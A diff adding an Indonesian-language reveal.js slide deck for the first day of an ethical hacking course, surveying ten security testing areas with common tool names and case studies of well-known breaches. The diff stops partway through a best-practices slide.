@@ -1,0 +1,3258 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Day 1: The Importance of Security</title>
+    
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/reveal.js@4.3.1/dist/reveal.css">
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/reveal.js@4.3.1/dist/theme/white.css">
+    
+    <style>
+        .reveal .slides section {
+            text-align: left;
+        }
+        .reveal h1, .reveal h2, .reveal h3 {
+            color: #2c3e50;
+        }
+        .code-block {
+            background: #2d2d2d;
+            color: #f8f8f2;
+            padding: 20px;
+            border-radius: 8px;
+            font-size: 0.65em;
+            font-family: 'Courier New', 'Monaco', 'Consolas', monospace;
+            overflow-x: auto;
+            line-height: 1.5;
+            border: 1px solid #444;
+            box-shadow: 0 2px 8px rgba(0,0,0,0.1);
+        }
+        .code-block pre {
+            margin: 0;
+            padding: 0;
+            background: transparent;
+            border: none;
+        }
+        .code-block code {
+            display: block;
+            white-space: pre;
+            overflow-x: auto;
+            color: #f8f8f2;
+        }
+        .code-block .comment {
+            color: #75715e;
+            font-style: italic;
+        }
+        .code-block .string {
+            color: #e6db74;
+        }
+        .code-block .keyword {
+            color: #66d9ef;
+        }
+        .code-block .function {
+            color: #a6e22e;
+        }
+        .code-block .variable {
+            color: #f92672;
+        }
+        .highlight {
+            background-color: #fff3cd;
+            padding: 2px 5px;
+        }
+        .warning {
+            background-color: #f8d7da;
+            padding: 10px;
+            border-left: 4px solid #dc3545;
+            margin: 10px 0;
+        }
+        .success {
+            background-color: #d4edda;
+            padding: 10px;
+            border-left: 4px solid #28a745;
+            margin: 10px 0;
+        }
+        .info {
+            background-color: #d1ecf1;
+            padding: 10px;
+            border-left: 4px solid #17a2b8;
+            margin: 10px 0;
+        }
+        .two-column {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 20px;
+        }
+        .center {
+            text-align: center;
+        }
+        table {
+            font-size: 0.7em;
+            width: 100%;
+        }
+        table th, table td {
+            padding: 8px;
+            border: 1px solid #ddd;
+        }
+    </style>
+</head>
+<body>
+    <div class="reveal">
+        <div class="slides">
+            
+            <!-- Title -->
+            <section>
+                <h1>Day 1</h1>
+                <h2>The Importance of Security</h2>
+                <p style="margin-top: 50px;">
+                    <a href="index.html">← Kembali ke Menu Utama</a>
+                </p>
+            </section>
+
+            <!-- Learning Objectives -->
+            <section>
+                <h2>Tujuan Pembelajaran</h2>
+                <ul>
+                    <li>Memahami konsep ethical hacking dan metodologinya</li>
+                    <li>Mengenal berbagai jenis serangan berdasarkan OWASP Top 10</li>
+                    <li>Memahami dasar-dasar keamanan komputer</li>
+                    <li>Menerapkan secure programming dalam SDLC</li>
+                </ul>
+            </section>
+
+            <!-- 1.1 Overview of Ethical Hacking -->
+            <section>
+                <section>
+                    <h2>1.1 Overview of Ethical Hacking</h2>
+                    <p><strong>Ethical Hacking</strong> adalah praktik menguji sistem komputer, jaringan, atau aplikasi untuk menemukan kerentanan keamanan sebelum penyerang jahat menemukannya.</p>
+                </section>
+
+                <section>
+                    <h3>Karakteristik Ethical Hacker</h3>
+                    <ol>
+                        <li><strong>Legal Authorization</strong>: Memiliki izin tertulis</li>
+                        <li><strong>Ethical Purpose</strong>: Tujuan untuk meningkatkan keamanan</li>
+                        <li><strong>Responsible Disclosure</strong>: Melaporkan temuan dengan cara yang bertanggung jawab</li>
+                        <li><strong>Professional Standards</strong>: Mengikuti standar dan kode etik profesional</li>
+                    </ol>
+                </section>
+
+                <section>
+                    <h3>Jenis-jenis Hacker</h3>
+                    <table>
+                        <thead>
+                            <tr>
+                                <th>Jenis</th>
+                                <th>Tujuan</th>
+                                <th>Legalitas</th>
+                            </tr>
+                        </thead>
+                        <tbody>
+                            <tr>
+                                <td><strong>White Hat</strong></td>
+                                <td>Meningkatkan keamanan</td>
+                                <td>Legal</td>
+                            </tr>
+                            <tr>
+                                <td><strong>Black Hat</strong></td>
+                                <td>Keuntungan pribadi</td>
+                                <td>Ilegal</td>
+                            </tr>
+                            <tr>
+                                <td><strong>Gray Hat</strong></td>
+                                <td>Campuran</td>
+                                <td>Ambigu</td>
+                            </tr>
+                        </tbody>
+                    </table>
+                </section>
+
+                <section>
+                    <h3>Area yang Diuji dalam Ethical Hacking</h3>
+                    <p>Ethical hacking mencakup pengujian berbagai aspek keamanan sistem dan infrastruktur</p>
+                    <ul style="font-size: 0.85em;">
+                        <li><strong>Network Security</strong> - Keamanan jaringan dan infrastruktur</li>
+                        <li><strong>Web Application Security</strong> - Keamanan aplikasi web</li>
+                        <li><strong>Mobile Application Security</strong> - Keamanan aplikasi mobile</li>
+                        <li><strong>Wireless Security</strong> - Keamanan jaringan nirkabel</li>
+                        <li><strong>Cloud Security</strong> - Keamanan cloud infrastructure</li>
+                        <li><strong>API Security</strong> - Keamanan API dan microservices</li>
+                        <li><strong>Database Security</strong> - Keamanan database</li>
+                        <li><strong>IoT Security</strong> - Keamanan Internet of Things</li>
+                        <li><strong>Social Engineering</strong> - Pengujian faktor manusia</li>
+                        <li><strong>Physical Security</strong> - Keamanan fisik</li>
+                    </ul>
+                </section>
+            </section>
+
+            <!-- 1.2 Areas Tested in Ethical Hacking -->
+            <section>
+                <section>
+                    <h2>1.2 Area yang Diuji dalam Ethical Hacking</h2>
+                    <p>Berbagai aspek sistem dan infrastruktur yang diuji untuk menemukan kerentanan keamanan</p>
+                </section>
+
+                <!-- Network Security -->
+                <section>
+                    <h3>1. Network Security</h3>
+                    <p><strong>Deskripsi:</strong> Pengujian keamanan infrastruktur jaringan, protokol, dan perangkat jaringan</p>
+                    <div class="two-column">
+                        <div>
+                            <h4>Aspek yang Diuji:</h4>
+                            <ul style="font-size: 0.85em;">
+                                <li>Firewall configuration</li>
+                                <li>Router dan switch security</li>
+                                <li>Network segmentation</li>
+                                <li>Intrusion Detection Systems (IDS)</li>
+                                <li>VPN security</li>
+                                <li>Network protocols (TCP/IP, DNS, DHCP)</li>
+                                <li>Port security</li>
+                                <li>Network monitoring</li>
+                            </ul>
+                        </div>
+                        <div>
+                            <h4>Tools:</h4>
+                            <ul style="font-size: 0.85em;">
+                                <li>Nmap - Network scanning</li>
+                                <li>Wireshark - Packet analysis</li>
+                                <li>Nessus - Vulnerability scanning</li>
+                                <li>Metasploit - Exploitation</li>
+                                <li>Aircrack-ng - Wireless testing</li>
+                                <li>Burp Suite - Web testing</li>
+                            </ul>
+                        </div>
+                    </div>
+                    <div class="info" style="margin-top: 15px;">
+                        <strong>Contoh Vulnerability:</strong> Open ports, misconfigured firewall rules, unencrypted protocols, weak network segmentation
+                    </div>
+                </section>
+
+                <section>
+                    <h3>Network Security - Studi Kasus</h3>
+                    <div class="two-column">
+                        <div>
+                            <h4>Kasus: Target Breach (2013)</h4>
+                            <p style="font-size: 0.75em;"><strong>Network Security Issues:</strong></p>
+                            <ul style="font-size: 0.7em;">
+                                <li>Vendor network tidak terpisah dari payment network</li>
+                                <li>Weak network segmentation</li>
+                                <li>Firewall rules yang terlalu permisif</li>
+                                <li>Lack of network monitoring</li>
+                                <li>Vendor credentials compromised</li>
+                            </ul>
+                        </div>
+                        <div>
+                            <h4>Dampak:</h4>
+                            <ul style="font-size: 0.7em;">
+                                <li>40 juta kartu kredit dicuri</li>
+                                <li>70 juta customer records ter-expose</li>
+                                <li>Kerugian $162 juta</li>
+                                <li>CEO mengundurkan diri</li>
+                            </ul>
+                            <div class="warning" style="margin-top: 10px; font-size: 0.7em;">
+                                <strong>Lesson:</strong> Network segmentation yang kuat sangat penting untuk mencegah lateral movement
+                            </div>
+                        </div>
+                    </div>
+                </section>
+
+                <!-- Web Application Security -->
+                <section>
+                    <h3>2. Web Application Security</h3>
+                    <p><strong>Deskripsi:</strong> Pengujian keamanan aplikasi web untuk menemukan vulnerability seperti OWASP Top 10</p>
+                    <div class="two-column">
+                        <div>
+                            <h4>Aspek yang Diuji:</h4>
+                            <ul style="font-size: 0.85em;">
+                                <li>Authentication & Authorization</li>
+                                <li>Input validation</li>
+                                <li>Session management</li>
+                                <li>SQL Injection</li>
+                                <li>Cross-Site Scripting (XSS)</li>
+                                <li>Cross-Site Request Forgery (CSRF)</li>
+                                <li>File upload vulnerabilities</li>
+                                <li>API security</li>
+                            </ul>
+                        </div>
+                        <div>
+                            <h4>Tools:</h4>
+                            <ul style="font-size: 0.85em;">
+                                <li>Burp Suite - Web proxy</li>
+                                <li>OWASP ZAP - Security scanner</li>
+                                <li>SQLMap - SQL injection</li>
+                                <li>Nikto - Web server scanner</li>
+                                <li>Acunetix - Automated scanner</li>
+                                <li>Postman - API testing</li>
+                            </ul>
+                        </div>
+                    </div>
+                    <div class="info" style="margin-top: 15px;">
+                        <strong>Standar:</strong> OWASP Top 10, OWASP Testing Guide, PTES (Penetration Testing Execution Standard)
+                    </div>
+                </section>
+
+                <section>
+                    <h3>Web Application Security - Studi Kasus</h3>
+                    <div class="two-column">
+                        <div>
+                            <h4>Kasus: Equifax Breach (2017)</h4>
+                            <p style="font-size: 0.75em;"><strong>Web Application Issues:</strong></p>
+                            <ul style="font-size: 0.7em;">
+                                <li>Apache Struts vulnerability (CVE-2017-5638)</li>
+                                <li>Remote code execution via web application</li>
+                                <li>No WAF (Web Application Firewall)</li>
+                                <li>Insufficient input validation</li>
+                                <li>Patch tidak di-apply meskipun sudah tersedia</li>
+                            </ul>
+                        </div>
+                        <div>
+                            <h4>Dampak:</h4>
+                            <ul style="font-size: 0.7em;">
+                                <li>147 juta records dicuri</li>
+                                <li>SSN, kartu kredit, data pribadi ter-expose</li>
+                                <li>$700 juta settlement</li>
+                                <li>Kerugian reputasi besar</li>
+                            </ul>
+                            <div class="warning" style="margin-top: 10px; font-size: 0.7em;">
+                                <strong>Lesson:</strong> Patch management dan web application security testing sangat kritis
+                            </div>
+                        </div>
+                    </div>
+                </section>
+
+                <!-- Mobile Application Security -->
+                <section>
+                    <h3>3. Mobile Application Security</h3>
+                    <p><strong>Deskripsi:</strong> Pengujian keamanan aplikasi mobile (iOS, Android) dan platform mobile</p>
+                    <div class="two-column">
+                        <div>
+                            <h4>Aspek yang Diuji:</h4>
+                            <ul style="font-size: 0.85em;">
+                                <li>Data storage security</li>
+                                <li>Authentication & authorization</li>
+                                <li>API security</li>
+                                <li>Code obfuscation</li>
+                                <li>Reverse engineering</li>
+                                <li>Certificate pinning</li>
+                                <li>Jailbreak/root detection</li>
+                                <li>Insecure data transmission</li>
+                            </ul>
+                        </div>
+                        <div>
+                            <h4>Tools:</h4>
+                            <ul style="font-size: 0.85em;">
+                                <li>MobSF - Mobile Security Framework</li>
+                                <li>Frida - Dynamic instrumentation</li>
+                                <li>APKTool - Android reverse engineering</li>
+                                <li>Burp Suite - API testing</li>
+                                <li>OWASP Mobile Top 10</li>
+                                <li>iLEAKS - iOS security testing</li>
+                            </ul>
+                        </div>
+                    </div>
+                    <div class="info" style="margin-top: 15px;">
+                        <strong>Standar:</strong> OWASP Mobile Top 10, OWASP Mobile Security Testing Guide
+                    </div>
+                </section>
+
+                <section>
+                    <h3>Mobile Application Security - Studi Kasus</h3>
+                    <div class="two-column">
+                        <div>
+                            <h4>Kasus: WhatsApp Vulnerability (2019)</h4>
+                            <p style="font-size: 0.75em;"><strong>Mobile Security Issues:</strong></p>
+                            <ul style="font-size: 0.7em;">
+                                <li>Buffer overflow vulnerability (CVE-2019-3568)</li>
+                                <li>Remote code execution via video call</li>
+                                <li>No proper input validation</li>
+                                <li>Memory corruption vulnerability</li>
+                                <li>Affected iOS and Android</li>
+                            </ul>
+                        </div>
+                        <div>
+                            <h4>Dampak:</h4>
+                            <ul style="font-size: 0.7em;">
+                                <li>1.5 miliar users berpotensi terpengaruh</li>
+                                <li>Remote code execution</li>
+                                <li>Data access tanpa otorisasi</li>
+                                <li>Spyware installation (Pegasus)</li>
+                            </ul>
+                            <div class="warning" style="margin-top: 10px; font-size: 0.7em;">
+                                <strong>Lesson:</strong> Input validation dan secure coding practices sangat penting untuk mobile apps
+                            </div>
+                        </div>
+                    </div>
+                </section>
+
+                <!-- Wireless Security -->
+                <section>
+                    <h3>4. Wireless Security</h3>
+                    <p><strong>Deskripsi:</strong> Pengujian keamanan jaringan nirkabel (Wi-Fi, Bluetooth, RFID)</p>
+                    <div class="two-column">
+                        <div>
+                            <h4>Aspek yang Diuji:</h4>
+                            <ul style="font-size: 0.85em;">
+                                <li>Wi-Fi encryption (WEP, WPA, WPA2, WPA3)</li>
+                                <li>Access point security</li>
+                                <li>Rogue access points</li>
+                                <li>Bluetooth security</li>
+                                <li>RFID security</li>
+                                <li>Wireless intrusion detection</li>
+                                <li>Weak passwords</li>
+                                <li>MAC address filtering</li>
+                            </ul>
+                        </div>
+                        <div>
+                            <h4>Tools:</h4>
+                            <ul style="font-size: 0.85em;">
+                                <li>Aircrack-ng - Wi-Fi cracking</li>
+                                <li>Kismet - Wireless detector</li>
+                                <li>Wireshark - Packet capture</li>
+                                <li>Reaver - WPS attack</li>
+                                <li>Bluetooth Scanner</li>
+                                <li>WiGLE - Wi-Fi database</li>
+                            </ul>
+                        </div>
+                    </div>
+                    <div class="info" style="margin-top: 15px;">
+                        <strong>Catatan:</strong> WEP sudah tidak aman, WPA2 dengan password kuat masih aman, WPA3 adalah standar terbaru
+                    </div>
+                </section>
+
+                <section>
+                    <h3>Wireless Security - Studi Kasus</h3>
+                    <div class="two-column">
+                        <div>
+                            <h4>Kasus: Wi-Fi Router Vulnerability</h4>
+                            <p style="font-size: 0.75em;"><strong>Wireless Security Issues:</strong></p>
+                            <ul style="font-size: 0.7em;">
+                                <li>Default credentials tidak diubah</li>
+                                <li>WPS (Wi-Fi Protected Setup) enabled</li>
+                                <li>Weak encryption (WEP atau WPA)</li>
+                                <li>No guest network isolation</li>
+                                <li>Firmware outdated</li>
+                            </ul>
+                        </div>
+                        <div>
+                            <h4>Dampak:</h4>
+                            <ul style="font-size: 0.7em;">
+                                <li>Unauthorized network access</li>
+                                <li>Man-in-the-middle attacks</li>
+                                <li>Data interception</li>
+                                <li>Access ke internal network</li>
+                                <li>Router compromise</li>
+                            </ul>
+                            <div class="warning" style="margin-top: 10px; font-size: 0.7em;">
+                                <strong>Lesson:</strong> Selalu ubah default credentials, disable WPS, gunakan WPA2/WPA3 dengan password kuat
+                            </div>
+                        </div>
+                    </div>
+                </section>
+
+                <!-- Cloud Security -->
+                <section>
+                    <h3>5. Cloud Security</h3>
+                    <p><strong>Deskripsi:</strong> Pengujian keamanan cloud infrastructure dan services (AWS, Azure, GCP)</p>
+                    <div class="two-column">
+                        <div>
+                            <h4>Aspek yang Diuji:</h4>
+                            <ul style="font-size: 0.85em;">
+                                <li>Cloud misconfiguration</li>
+                                <li>Identity & Access Management (IAM)</li>
+                                <li>Storage bucket security (S3, Blob)</li>
+                                <li>Cloud API security</li>
+                                <li>Container security (Docker, Kubernetes)</li>
+                                <li>Serverless security</li>
+                                <li>Cloud network security</li>
+                                <li>Compliance & governance</li>
+                            </ul>
+                        </div>
+                        <div>
+                            <h4>Tools:</h4>
+                            <ul style="font-size: 0.85em;">
+                                <li>CloudSploit - AWS security scanner</li>
+                                <li>Prowler - AWS security assessment</li>
+                                <li>Scout Suite - Multi-cloud scanner</li>
+                                <li>Cloud Security Alliance (CSA) tools</li>
+                                <li>Kube-hunter - Kubernetes security</li>
+                                <li>CloudTrail analysis tools</li>
+                            </ul>
+                        </div>
+                    </div>
+                    <div class="info" style="margin-top: 15px;">
+                        <strong>Standar:</strong> CSA Cloud Controls Matrix, CIS Benchmarks, Cloud Security Alliance (CSA) Top Threats
+                    </div>
+                </section>
+
+                <section>
+                    <h3>Cloud Security - Studi Kasus</h3>
+                    <div class="two-column">
+                        <div>
+                            <h4>Kasus: Capital One Breach (2019)</h4>
+                            <p style="font-size: 0.75em;"><strong>Cloud Security Issues:</strong></p>
+                            <ul style="font-size: 0.7em;">
+                                <li>AWS S3 bucket misconfigured</li>
+                                <li>SSRF vulnerability di web application</li>
+                                <li>Akses ke AWS metadata service</li>
+                                <li>IAM role dengan permissions berlebihan</li>
+                                <li>Firewall misconfiguration</li>
+                            </ul>
+                        </div>
+                        <div>
+                            <h4>Dampak:</h4>
+                            <ul style="font-size: 0.7em;">
+                                <li>100 juta records dicuri</li>
+                                <li>SSN dan kartu kredit ter-expose</li>
+                                <li>$190 juta settlement</li>
+                                <li>Reputasi perusahaan rusak</li>
+                            </ul>
+                            <div class="warning" style="margin-top: 10px; font-size: 0.7em;">
+                                <strong>Lesson:</strong> Cloud misconfiguration adalah salah satu risiko terbesar di cloud security
+                            </div>
+                        </div>
+                    </div>
+                </section>
+
+                <!-- API Security -->
+                <section>
+                    <h3>6. API Security</h3>
+                    <p><strong>Deskripsi:</strong> Pengujian keamanan API (REST, GraphQL, SOAP) dan microservices</p>
+                    <div class="two-column">
+                        <div>
+                            <h4>Aspek yang Diuji:</h4>
+                            <ul style="font-size: 0.85em;">
+                                <li>Authentication & Authorization (OAuth, JWT)</li>
+                                <li>API rate limiting</li>
+                                <li>Input validation</li>
+                                <li>API injection attacks</li>
+                                <li>Broken object level authorization</li>
+                                <li>Mass assignment vulnerabilities</li>
+                                <li>Insufficient logging & monitoring</li>
+                                <li>API versioning security</li>
+                            </ul>
+                        </div>
+                        <div>
+                            <h4>Tools:</h4>
+                            <ul style="font-size: 0.85em;">
+                                <li>Postman - API testing</li>
+                                <li>Burp Suite - API security</li>
+                                <li>OWASP ZAP - API scanning</li>
+                                <li>REST Assured - API testing</li>
+                                <li>GraphQL security tools</li>
+                                <li>API security scanners</li>
+                            </ul>
+                        </div>
+                    </div>
+                    <div class="info" style="margin-top: 15px;">
+                        <strong>Standar:</strong> OWASP API Security Top 10, REST Security Cheat Sheet
+                    </div>
+                </section>
+
+                <section>
+                    <h3>API Security - Studi Kasus</h3>
+                    <div class="two-column">
+                        <div>
+                            <h4>Kasus: Facebook API Breach (2018)</h4>
+                            <p style="font-size: 0.75em;"><strong>API Security Issues:</strong></p>
+                            <ul style="font-size: 0.7em;">
+                                <li>Broken access control di GraphQL API</li>
+                                <li>Excessive API permissions</li>
+                                <li>No rate limiting</li>
+                                <li>Access tokens tidak expire</li>
+                                <li>Insufficient input validation</li>
+                            </ul>
+                        </div>
+                        <div>
+                            <h4>Dampak:</h4>
+                            <ul style="font-size: 0.7em;">
+                                <li>87 juta user data diakses tanpa izin</li>
+                                <li>Cambridge Analytica scandal</li>
+                                <li>$5 miliar denda FTC</li>
+                                <li>Trust issues dengan users</li>
+                            </ul>
+                            <div class="warning" style="margin-top: 10px; font-size: 0.7em;">
+                                <strong>Lesson:</strong> API access control dan rate limiting sangat penting untuk mencegah abuse
+                            </div>
+                        </div>
+                    </div>
+                </section>
+
+                <!-- Database Security -->
+                <section>
+                    <h3>7. Database Security</h3>
+                    <p><strong>Deskripsi:</strong> Pengujian keamanan database dan data storage systems</p>
+                    <div class="two-column">
+                        <div>
+                            <h4>Aspek yang Diuji:</h4>
+                            <ul style="font-size: 0.85em;">
+                                <li>SQL injection vulnerabilities</li>
+                                <li>Database misconfiguration</li>
+                                <li>Default credentials</li>
+                                <li>Privilege escalation</li>
+                                <li>Data encryption (at rest & in transit)</li>
+                                <li>Database access controls</li>
+                                <li>Backup security</li>
+                                <li>Database auditing & logging</li>
+                            </ul>
+                        </div>
+                        <div>
+                            <h4>Tools:</h4>
+                            <ul style="font-size: 0.85em;">
+                                <li>SQLMap - SQL injection</li>
+                                <li>Nmap - Database port scanning</li>
+                                <li>Database-specific tools (MySQL, PostgreSQL, MongoDB)</li>
+                                <li>NoSQLMap - NoSQL injection</li>
+                                <li>Database security scanners</li>
+                                <li>Data encryption tools</li>
+                            </ul>
+                        </div>
+                    </div>
+                    <div class="info" style="margin-top: 15px;">
+                        <strong>Catatan:</strong> Database sering menjadi target utama karena berisi data sensitif
+                    </div>
+                </section>
+
+                <section>
+                    <h3>Database Security - Studi Kasus</h3>
+                    <div class="two-column">
+                        <div>
+                            <h4>Kasus: MongoDB Ransomware (2017)</h4>
+                            <p style="font-size: 0.75em;"><strong>Database Security Issues:</strong></p>
+                            <ul style="font-size: 0.7em;">
+                                <li>28,000+ MongoDB databases tanpa password</li>
+                                <li>Default configuration tidak diubah</li>
+                                <li>Remote access enabled tanpa authentication</li>
+                                <li>No encryption</li>
+                                <li>No firewall protection</li>
+                            </ul>
+                        </div>
+                        <div>
+                            <h4>Dampak:</h4>
+                            <ul style="font-size: 0.7em;">
+                                <li>Ribuan database di-hack</li>
+                                <li>Data dihapus dan diganti dengan ransom note</li>
+                                <li>Data loss besar-besaran</li>
+                                <li>Ransomware attack</li>
+                            </ul>
+                            <div class="warning" style="margin-top: 10px; font-size: 0.7em;">
+                                <strong>Lesson:</strong> Selalu ubah default configuration, enable authentication, dan gunakan firewall
+                            </div>
+                        </div>
+                    </div>
+                </section>
+
+                <!-- IoT Security -->
+                <section>
+                    <h3>8. IoT Security</h3>
+                    <p><strong>Deskripsi:</strong> Pengujian keamanan perangkat Internet of Things (IoT)</p>
+                    <div class="two-column">
+                        <div>
+                            <h4>Aspek yang Diuji:</h4>
+                            <ul style="font-size: 0.85em;">
+                                <li>Default credentials</li>
+                                <li>Insecure firmware</li>
+                                <li>Weak encryption</li>
+                                <li>Insecure network services</li>
+                                <li>Lack of secure update mechanism</li>
+                                <li>Insufficient privacy protection</li>
+                                <li>Insecure data storage</li>
+                                <li>Lack of device management</li>
+                            </ul>
+                        </div>
+                        <div>
+                            <h4>Tools:</h4>
+                            <ul style="font-size: 0.85em;">
+                                <li>Shodan - IoT device search</li>
+                                <li>Nmap - Device scanning</li>
+                                <li>Firmware analysis tools</li>
+                                <li>IoT security scanners</li>
+                                <li>Hardware hacking tools</li>
+                                <li>IoT-specific frameworks</li>
+                            </ul>
+                        </div>
+                    </div>
+                    <div class="info" style="margin-top: 15px;">
+                        <strong>Standar:</strong> OWASP IoT Top 10, IoT Security Foundation Guidelines
+                    </div>
+                </section>
+
+                <section>
+                    <h3>IoT Security - Studi Kasus</h3>
+                    <div class="two-column">
+                        <div>
+                            <h4>Kasus: Mirai Botnet (2016)</h4>
+                            <p style="font-size: 0.75em;"><strong>IoT Security Issues:</strong></p>
+                            <ul style="font-size: 0.7em;">
+                                <li>600,000+ IoT devices compromised</li>
+                                <li>Default credentials tidak diubah</li>
+                                <li>Insecure firmware</li>
+                                <li>No security updates</li>
+                                <li>Weak authentication</li>
+                            </ul>
+                        </div>
+                        <div>
+                            <h4>Dampak:</h4>
+                            <ul style="font-size: 0.7em;">
+                                <li>DDoS attack terbesar saat itu (1 Tbps)</li>
+                                <li>Internet infrastructure terpengaruh</li>
+                                <li>Major websites down (Twitter, Netflix, GitHub)</li>
+                                <li>IoT devices menjadi botnet</li>
+                            </ul>
+                            <div class="warning" style="margin-top: 10px; font-size: 0.7em;">
+                                <strong>Lesson:</strong> IoT devices sering memiliki security yang lemah dan menjadi target mudah untuk botnet
+                            </div>
+                        </div>
+                    </div>
+                </section>
+
+                <!-- Social Engineering -->
+                <section>
+                    <h3>9. Social Engineering</h3>
+                    <p><strong>Deskripsi:</strong> Pengujian faktor manusia melalui manipulasi psikologis</p>
+                    <div class="two-column">
+                        <div>
+                            <h4>Aspek yang Diuji:</h4>
+                            <ul style="font-size: 0.85em;">
+                                <li>Phishing attacks</li>
+                                <li>Spear phishing</li>
+                                <li>Vishing (voice phishing)</li>
+                                <li>Pretexting</li>
+                                <li>Baiting</li>
+                                <li>Tailgating (physical)</li>
+                                <li>Shoulder surfing</li>
+                                <li>Security awareness</li>
+                            </ul>
+                        </div>
+                        <div>
+                            <h4>Tools:</h4>
+                            <ul style="font-size: 0.85em;">
+                                <li>SET (Social Engineering Toolkit)</li>
+                                <li>Gophish - Phishing framework</li>
+                                <li>King Phisher - Phishing campaigns</li>
+                                <li>Maltego - OSINT</li>
+                                <li>Custom phishing templates</li>
+                                <li>Email spoofing tools</li>
+                            </ul>
+                        </div>
+                    </div>
+                    <div class="info" style="margin-top: 15px;">
+                        <strong>Catatan:</strong> Social engineering sering menjadi entry point utama untuk serangan yang lebih besar
+                    </div>
+                </section>
+
+                <section>
+                    <h3>Social Engineering - Studi Kasus</h3>
+                    <div class="two-column">
+                        <div>
+                            <h4>Kasus: Twitter Hack (2020)</h4>
+                            <p style="font-size: 0.75em;"><strong>Social Engineering Issues:</strong></p>
+                            <ul style="font-size: 0.7em;">
+                                <li>Phone spear phishing attack</li>
+                                <li>Social engineering terhadap employees</li>
+                                <li>Bypass MFA melalui social engineering</li>
+                                <li>Access ke internal admin tools</li>
+                                <li>Manipulasi untuk mendapatkan credentials</li>
+                            </ul>
+                        </div>
+                        <div>
+                            <h4>Dampak:</h4>
+                            <ul style="font-size: 0.7em;">
+                                <li>130+ high-profile accounts di-hack</li>
+                                <li>Bitcoin scam tweets</li>
+                                <li>Reputasi Twitter terpengaruh</li>
+                                <li>Trust issues dengan platform</li>
+                            </ul>
+                            <div class="warning" style="margin-top: 10px; font-size: 0.7em;">
+                                <strong>Lesson:</strong> Security awareness training sangat penting untuk mencegah social engineering
+                            </div>
+                        </div>
+                    </div>
+                </section>
+
+                <!-- Physical Security -->
+                <section>
+                    <h3>10. Physical Security</h3>
+                    <p><strong>Deskripsi:</strong> Pengujian keamanan fisik fasilitas dan perangkat</p>
+                    <div class="two-column">
+                        <div>
+                            <h4>Aspek yang Diuji:</h4>
+                            <ul style="font-size: 0.85em;">
+                                <li>Access control systems</li>
+                                <li>Surveillance systems</li>
+                                <li>Lock picking</li>
+                                <li>Tailgating</li>
+                                <li>Dumpster diving</li>
+                                <li>USB drop attacks</li>
+                                <li>Server room security</li>
+                                <li>Badge cloning</li>
+                            </ul>
+                        </div>
+                        <div>
+                            <h4>Tools:</h4>
+                            <ul style="font-size: 0.85em;">
+                                <li>Lock picking tools</li>
+                                <li>RFID cloners</li>
+                                <li>USB devices (Rubber Ducky)</li>
+                                <li>Physical access tools</li>
+                                <li>Camera detection tools</li>
+                                <li>Social engineering</li>
+                            </ul>
+                        </div>
+                    </div>
+                    <div class="info" style="margin-top: 15px;">
+                        <strong>Catatan:</strong> Physical security adalah layer pertama pertahanan, jika breached dapat memberikan akses langsung ke sistem
+                    </div>
+                </section>
+
+                <section>
+                    <h3>Physical Security - Studi Kasus</h3>
+                    <div class="two-column">
+                        <div>
+                            <h4>Kasus: Stuxnet (2010)</h4>
+                            <p style="font-size: 0.75em;"><strong>Physical Security Issues:</strong></p>
+                            <ul style="font-size: 0.7em;">
+                                <li>Malware di-inject melalui USB drive</li>
+                                <li>Physical access ke air-gapped network</li>
+                                <li>Insider threat atau social engineering</li>
+                                <li>No USB port restrictions</li>
+                                <li>Insufficient physical security controls</li>
+                            </ul>
+                        </div>
+                        <div>
+                            <h4>Dampak:</h4>
+                            <ul style="font-size: 0.7em;">
+                                <li>Iranian nuclear facilities terpengaruh</li>
+                                <li>Centrifuges dihancurkan</li>
+                                <li>Cyber-physical attack pertama yang signifikan</li>
+                                <li>Demonstrasi risiko physical access</li>
+                            </ul>
+                            <div class="warning" style="margin-top: 10px; font-size: 0.7em;">
+                                <strong>Lesson:</strong> Physical security dan USB restrictions sangat penting bahkan untuk air-gapped systems
+                            </div>
+                        </div>
+                    </div>
+                </section>
+
+                <!-- Summary Areas -->
+                <section>
+                    <h3>Ringkasan Area yang Diuji</h3>
+                    <table style="font-size: 0.65em;">
+                        <thead>
+                            <tr>
+                                <th>Area</th>
+                                <th>Fokus Utama</th>
+                                <th>Risiko Umum</th>
+                                <th>Tools Populer</th>
+                            </tr>
+                        </thead>
+                        <tbody>
+                            <tr>
+                                <td><strong>Network</strong></td>
+                                <td>Infrastruktur jaringan</td>
+                                <td>Open ports, misconfiguration</td>
+                                <td>Nmap, Nessus</td>
+                            </tr>
+                            <tr>
+                                <td><strong>Web App</strong></td>
+                                <td>Aplikasi web</td>
+                                <td>OWASP Top 10</td>
+                                <td>Burp Suite, OWASP ZAP</td>
+                            </tr>
+                            <tr>
+                                <td><strong>Mobile</strong></td>
+                                <td>Aplikasi mobile</td>
+                                <td>Data storage, API security</td>
+                                <td>MobSF, Frida</td>
+                            </tr>
+                            <tr>
+                                <td><strong>Wireless</strong></td>
+                                <td>Jaringan nirkabel</td>
+                                <td>Weak encryption, default creds</td>
+                                <td>Aircrack-ng, Kismet</td>
+                            </tr>
+                            <tr>
+                                <td><strong>Cloud</strong></td>
+                                <td>Cloud infrastructure</td>
+                                <td>Misconfiguration, IAM</td>
+                                <td>CloudSploit, Prowler</td>
+                            </tr>
+                            <tr>
+                                <td><strong>API</strong></td>
+                                <td>API & microservices</td>
+                                <td>Broken auth, injection</td>
+                                <td>Postman, Burp Suite</td>
+                            </tr>
+                            <tr>
+                                <td><strong>Database</strong></td>
+                                <td>Database systems</td>
+                                <td>SQL injection, misconfig</td>
+                                <td>SQLMap, NoSQLMap</td>
+                            </tr>
+                            <tr>
+                                <td><strong>IoT</strong></td>
+                                <td>IoT devices</td>
+                                <td>Default creds, weak firmware</td>
+                                <td>Shodan, Nmap</td>
+                            </tr>
+                            <tr>
+                                <td><strong>Social Eng.</strong></td>
+                                <td>Faktor manusia</td>
+                                <td>Phishing, pretexting</td>
+                                <td>SET, Gophish</td>
+                            </tr>
+                            <tr>
+                                <td><strong>Physical</strong></td>
+                                <td>Keamanan fisik</td>
+                                <td>Access control, tailgating</td>
+                                <td>Lock picks, RFID cloners</td>
+                            </tr>
+                        </tbody>
+                    </table>
+                </section>
+
+                <section>
+                    <h3>Pentingnya Comprehensive Testing</h3>
+                    <div class="success">
+                        <h4>Best Practices:</h4>
+                        <ul style="font-size: 0.85em;">
